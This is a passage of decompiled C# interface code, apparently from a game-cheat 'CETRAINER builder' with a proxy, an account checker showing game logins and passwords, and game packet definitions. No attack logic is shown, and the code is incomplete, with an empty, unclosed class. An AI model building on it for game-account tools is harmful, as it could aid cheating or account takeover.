      this.metroButton5.TabIndex = 8;
      this.metroButton5.Text = "Reflesh";
      this.metroButton5.Theme = MetroThemeStyle.Dark;
      this.metroButton5.UseSelectable = true;
      this.metroButton5.Click += new EventHandler(this.metroButton5_Click);
      this.metroButton4.Location = new Point(307, 50);
      this.metroButton4.Margin = new Padding(2);
      this.metroButton4.Name = "metroButton4";
      this.metroButton4.Size = new Size(162, 40);
      this.metroButton4.Style = MetroColorStyle.Red;
      this.metroButton4.TabIndex = 7;
      this.metroButton4.Text = "Stop Proxy";
      this.metroButton4.Theme = MetroThemeStyle.Dark;
      this.metroButton4.UseSelectable = true;
      this.metroButton4.Click += new EventHandler(this.metroButton4_Click);
      this.metroButton3.Location = new Point(307, 7);
      this.metroButton3.Margin = new Padding(2);
      this.metroButton3.Name = "metroButton3";
      this.metroButton3.Size = new Size(162, 40);
      this.metroButton3.Style = MetroColorStyle.Red;
      this.metroButton3.TabIndex = 6;
      this.metroButton3.Text = "Start Proxy";
      this.metroButton3.Theme = MetroThemeStyle.Dark;
      this.metroButton3.UseSelectable = true;
      this.metroButton3.Click += new EventHandler(this.metroButton3_Click);
      this.hosts.CustomButton.Image = (Image) null;
      this.hosts.CustomButton.Location = new Point(99, 2);
      this.hosts.CustomButton.Margin = new Padding(1);
      this.hosts.CustomButton.Name = "";
      this.hosts.CustomButton.Size = new Size(199, 199);
      this.hosts.CustomButton.Style = MetroColorStyle.Blue;
      this.hosts.CustomButton.TabIndex = 1;
      this.hosts.CustomButton.Theme = MetroThemeStyle.Light;
      this.hosts.CustomButton.UseSelectable = true;
      this.hosts.CustomButton.Visible = false;
      this.hosts.Lines = new string[0];
      this.hosts.Location = new Point(2, 7);
      this.hosts.Margin = new Padding(2);
      this.hosts.MaxLength = (int) short.MaxValue;
      this.hosts.Multiline = true;
      this.hosts.Name = "hosts";
      this.hosts.PasswordChar = char.MinValue;
      this.hosts.ScrollBars = ScrollBars.None;
      this.hosts.SelectedText = "";
      this.hosts.SelectionLength = 0;
      this.hosts.SelectionStart = 0;
      this.hosts.ShortcutsEnabled = true;
      this.hosts.Size = new Size(301, 204);
      this.hosts.Style = MetroColorStyle.Red;
      this.hosts.TabIndex = 2;
      this.hosts.Theme = MetroThemeStyle.Dark;
      this.hosts.UseSelectable = true;
      this.hosts.WaterMarkColor = Color.FromArgb(109, 109, 109);
      this.hosts.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
      this.aboutpage.Controls.Add((Control) this.label7);
      this.aboutpage.Controls.Add((Control) this.label6);
      this.aboutpage.Controls.Add((Control) this.pictureBox2);
      this.aboutpage.Controls.Add((Control) this.label3);
      this.aboutpage.HorizontalScrollbarBarColor = true;
      this.aboutpage.HorizontalScrollbarHighlightOnWheel = false;
      this.aboutpage.HorizontalScrollbarSize = 10;
      this.aboutpage.Location = new Point(4, 38);
      this.aboutpage.Name = "aboutpage";
      this.aboutpage.Size = new Size(474, 213);
      this.aboutpage.TabIndex = 4;
      this.aboutpage.Text = "About";
      this.aboutpage.Theme = MetroThemeStyle.Dark;
      this.aboutpage.VerticalScrollbarBarColor = true;
      this.aboutpage.VerticalScrollbarHighlightOnWheel = false;
      this.aboutpage.VerticalScrollbarSize = 10;
      this.pictureBox2.Image = (Image) Resources.photo;
      this.pictureBox2.Location = new Point(115, 16);
      this.pictureBox2.Name = "pictureBox2";
      this.pictureBox2.Size = new Size(167, 115);
      this.pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox2.TabIndex = 3;
      this.pictureBox2.TabStop = false;
      this.pictureBox2.Click += new EventHandler(this.pictureBox2_Click);
      this.label3.AutoSize = true;
      this.label3.BackColor = Color.Transparent;
      this.label3.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.ForeColor = SystemColors.ButtonHighlight;
      this.label3.Location = new Point(114, 134);
      this.label3.Margin = new Padding(2, 0, 2, 0);
      this.label3.Name = "label3";
      this.label3.Size = new Size(117, 18);
      this.label3.TabIndex = 2;
      this.label3.Text = "Made by Casey";
      this.accountchecker.Controls.Add((Control) this.pictureBox3);
      this.accountchecker.Controls.Add((Control) this.status);
      this.accountchecker.Controls.Add((Control) this.label5);
      this.accountchecker.Controls.Add((Control) this.label4);
      this.accountchecker.Controls.Add((Control) this.metroButton7);
      this.accountchecker.Controls.Add((Control) this.animaTextBox4);
      this.accountchecker.Controls.Add((Control) this.animaTextBox3);
      this.accountchecker.Controls.Add((Control) this.listView2);
      this.accountchecker.HorizontalScrollbarBarColor = true;
      this.accountchecker.HorizontalScrollbarHighlightOnWheel = false;
      this.accountchecker.HorizontalScrollbarSize = 10;
      this.accountchecker.Location = new Point(4, 38);
      this.accountchecker.Name = "accountchecker";
      this.accountchecker.Size = new Size(474, 213);
      this.accountchecker.TabIndex = 5;
      this.accountchecker.Text = "Account Checker";
      this.accountchecker.Theme = MetroThemeStyle.Dark;
      this.accountchecker.VerticalScrollbarBarColor = true;
      this.accountchecker.VerticalScrollbarHighlightOnWheel = false;
      this.accountchecker.VerticalScrollbarSize = 10;
      this.listView2.BackColor = Color.Black;
  //    this.listView2.BorderStyle = BorderStyle.FixedSingle;
      this.listView2.Columns.AddRange(new ColumnHeader[4]
      {
        this.columnHeader2,
        this.columnHeader3,
        this.columnHeader4,
        this.columnHeader5
      });
      this.listView2.Font = new Font("Arial", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.listView2.ForeColor = Color.White;
      this.listView2.FullRowSelect = true;
      this.listView2.HideSelection = false;
      this.listView2.Location = new Point(0, 82);
      this.listView2.Name = "listView2";
      this.listView2.Size = new Size(322, 129);
      this.listView2.TabIndex = 13;
      this.listView2.UseCompatibleStateImageBehavior = false;
      this.listView2.View = View.Details;
      this.columnHeader2.Text = "GrowID";
      this.columnHeader2.Width = 90;
      this.columnHeader3.Text = "Password";
      this.columnHeader3.Width = 90;
      this.columnHeader4.Text = "World Locks";
      this.columnHeader4.Width = 80;
      this.columnHeader5.Text = "Gems";
      this.metroButton7.Location = new Point(326, 137);
      this.metroButton7.Name = "metroButton7";
      this.metroButton7.Size = new Size(142, 73);
      this.metroButton7.Style = MetroColorStyle.Red;
      this.metroButton7.TabIndex = 22;
      this.metroButton7.Text = "Check Account!";
      this.metroButton7.Theme = MetroThemeStyle.Dark;
      this.metroButton7.UseSelectable = true;
      this.animaTextBox4.CustomButton.Image = (Image) null;
      this.animaTextBox4.CustomButton.Location = new Point(260, 1);
      this.animaTextBox4.CustomButton.Name = "";
      this.animaTextBox4.CustomButton.Size = new Size(21, 21);
      this.animaTextBox4.CustomButton.Style = MetroColorStyle.Blue;
      this.animaTextBox4.CustomButton.TabIndex = 1;
      this.animaTextBox4.CustomButton.Theme = MetroThemeStyle.Light;
      this.animaTextBox4.CustomButton.UseSelectable = true;
      this.animaTextBox4.CustomButton.Visible = false;
      this.animaTextBox4.Lines = new string[0];
      this.animaTextBox4.Location = new Point(74, 13);
      this.animaTextBox4.MaxLength = (int) short.MaxValue;
      this.animaTextBox4.Name = "animaTextBox4";
      this.animaTextBox4.PasswordChar = char.MinValue;
      this.animaTextBox4.ScrollBars = ScrollBars.None;
      this.animaTextBox4.SelectedText = "";
      this.animaTextBox4.SelectionLength = 0;
      this.animaTextBox4.SelectionStart = 0;
      this.animaTextBox4.ShortcutsEnabled = true;
      this.animaTextBox4.Size = new Size(248, 23);
      this.animaTextBox4.TabIndex = 19;
      this.animaTextBox4.Theme = MetroThemeStyle.Dark;
      this.animaTextBox4.UseSelectable = true;
      this.animaTextBox4.WaterMarkColor = Color.FromArgb(109, 109, 109);
      this.animaTextBox4.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
      this.animaTextBox3.CustomButton.Image = (Image) null;
      this.animaTextBox3.CustomButton.Location = new Point(260, 1);
      this.animaTextBox3.CustomButton.Name = "";
      this.animaTextBox3.CustomButton.Size = new Size(21, 21);
      this.animaTextBox3.CustomButton.Style = MetroColorStyle.Blue;
      this.animaTextBox3.CustomButton.TabIndex = 1;
      this.animaTextBox3.CustomButton.Theme = MetroThemeStyle.Light;
      this.animaTextBox3.CustomButton.UseSelectable = true;
      this.animaTextBox3.CustomButton.Visible = false;
      this.animaTextBox3.Lines = new string[0];
      this.animaTextBox3.Location = new Point(74, 47);
      this.animaTextBox3.MaxLength = (int) short.MaxValue;
      this.animaTextBox3.Name = "animaTextBox3";
      this.animaTextBox3.PasswordChar = char.MinValue;
      this.animaTextBox3.ScrollBars = ScrollBars.None;
      this.animaTextBox3.SelectedText = "";
      this.animaTextBox3.SelectionLength = 0;
      this.animaTextBox3.SelectionStart = 0;
      this.animaTextBox3.ShortcutsEnabled = true;
      this.animaTextBox3.Size = new Size(248, 23);
      this.animaTextBox3.TabIndex = 18;
      this.animaTextBox3.Theme = MetroThemeStyle.Dark;
      this.animaTextBox3.UseSelectable = true;
      this.animaTextBox3.WaterMarkColor = Color.FromArgb(109, 109, 109);
      this.animaTextBox3.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
      this.label4.AutoSize = true;
      this.label4.BackColor = Color.Transparent;
      this.label4.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label4.ForeColor = SystemColors.ButtonHighlight;
      this.label4.Location = new Point(3, 14);
      this.label4.Margin = new Padding(2, 0, 2, 0);
      this.label4.Name = "label4";
      this.label4.Size = new Size(64, 18);
      this.label4.TabIndex = 23;
      this.label4.Text = "GrowID:";
      this.label5.AutoSize = true;
      this.label5.BackColor = Color.Transparent;
      this.label5.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label5.ForeColor = SystemColors.ButtonHighlight;
      this.label5.Location = new Point(19, 48);
      this.label5.Margin = new Padding(2, 0, 2, 0);
      this.label5.Name = "label5";
      this.label5.Size = new Size(48, 18);
      this.label5.TabIndex = 24;
      this.label5.Text = "Pass:";
      this.status.AutoSize = true;
      this.status.Location = new Point(330, 113);
      this.status.Name = "status";
      this.status.Size = new Size(0, 0);
      this.status.Style = MetroColorStyle.Red;
      this.status.TabIndex = 25;
      this.status.Theme = MetroThemeStyle.Dark;
      this.pictureBox3.Image = (Image) componentResourceManager.GetObject("pictureBox3.Image");
      this.pictureBox3.Location = new Point(328, 13);
      this.pictureBox3.Name = "pictureBox3";
      this.pictureBox3.Size = new Size(140, 89);
      this.pictureBox3.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox3.TabIndex = 26;
      this.pictureBox3.TabStop = false;
      this.label6.AutoSize = true;
      this.label6.BackColor = Color.Transparent;
      this.label6.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label6.ForeColor = SystemColors.ButtonHighlight;
      this.label6.Location = new Point(114, 165);
      this.label6.Margin = new Padding(2, 0, 2, 0);
      this.label6.Name = "label6";
      this.label6.Size = new Size(268, 18);
      this.label6.TabIndex = 4;
      this.label6.Text = "CETRAINER Builder by Dream Haxor";
      this.label7.AutoSize = true;
      this.label7.BackColor = Color.Transparent;
      this.label7.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label7.ForeColor = SystemColors.ButtonHighlight;
      this.label7.Location = new Point(186, 54);
      this.label7.Margin = new Padding(2, 0, 2, 0);
      this.label7.Name = "label7";
      this.label7.Size = new Size(0, 18);
      this.label7.TabIndex = 5;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(501, 313);
      this.Controls.Add((Control) this.tabcontrol);
      this.Margin = new Padding(2);
      this.Name = nameof (Form1);
      this.Padding = new Padding(13, 60, 13, 13);
      this.Style = MetroColorStyle.Red;
      this.Text = "GrowZBuilder V.0.5";
      this.Theme = MetroThemeStyle.Dark;
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.tabcontrol.ResumeLayout(false);
      this.mainpage.ResumeLayout(false);
      this.mainpage.PerformLayout();
      this.bindpage.ResumeLayout(false);
      this.bindpage.PerformLayout();
      this.morepage.ResumeLayout(false);
      this.aboutpage.ResumeLayout(false);
      this.aboutpage.PerformLayout();
      ((ISupportInitialize) this.pictureBox2).EndInit();
      this.accountchecker.ResumeLayout(false);
      this.accountchecker.PerformLayout();
      ((ISupportInitialize) this.pictureBox3).EndInit();
      this.ResumeLayout(false);
    }

    public class PacketSending
    {
      private Random rand = new Random();




  

    public class NetTypes
    {
      public enum PacketTypes
      {
        PLAYER_LOGIC_UPDATE,
        CALL_FUNCTION,
        UPDATE_STATUS,
        TILE_CHANGE_REQ,
        LOAD_MAP,
        TILE_EXTRA,
        TILE_EXTRA_MULTI,
        TILE_ACTIVATE,
        APPLY_DMG,
        INVENTORY_STATE,
        ITEM_ACTIVATE,
        ITEM_ACTIVATE_OBJ,
        UPDATE_TREE,
        MODIFY_INVENTORY_ITEM,
        MODIFY_ITEM_OBJ,
        APPLY_LOCK,
        UPDATE_ITEMS_DATA,
        PARTICLE_EFF,
        ICON_STATE,
        ITEM_EFF,
        SET_CHARACTER_STATE,
        PING_REPLY,
        PING_REQ,
        PLAYER_HIT,
        APP_CHECK_RESPONSE,
        APP_INTEGRITY_FAIL,
        DISCONNECT,
        BATTLE_JOIN,
        BATTLE_EVENT,
        USE_DOOR,
        PARENTAL_MSG,
        GONE_FISHIN,
        STEAM,
        PET_BATTLE,
        NPC,
        SPECIAL,
        PARTICLE_EFFECT_V2,
        ARROW_TO_ITEM,
        TILE_INDEX_SELECTION,
        UPDATE_PLAYER_TRIBUTE,
      }

      public enum NetMessages
      {
        UNKNOWN,
        SERVER_HELLO,
        GENERIC_TEXT,
        GAME_MESSAGE,
        GAME_PACKET,
        ERROR,
        TRACK,
        LOG_REQ,
        LOG_RES,
      }
    }

    private class VariantList
    {
      [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
      public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

      public byte[] get_extended_data(byte[] pktData) => ((IEnumerable<byte>) pktData).Skip<byte>(56).ToArray<byte>();

      public byte[] get_struct_data(byte[] package)
      {
        int length = package.Length;
        if (length < 60)
          return (byte[]) null;
        byte[] numArray = new byte[length - 4];
        Array.Copy((Array) package, 4, (Array) numArray, 0, length - 4);
        BitConverter.ToInt32(package, 56);
        if (((int) package[16] & 8) == 0)
          Array.Copy((Array) BitConverter.GetBytes(0), 0, (Array) package, 56, 4);
        return numArray;
      }

    
      public struct VarList
      {
        public string FunctionName;
        public int netID;
        public uint delay;
        public object[] functionArgs;
      }

      public enum OnSendToServerArgs
      {
        port = 1,
        token = 2,
        userId = 3,
        IPWithExtraData = 4,
      }
    }
  }
    }
}
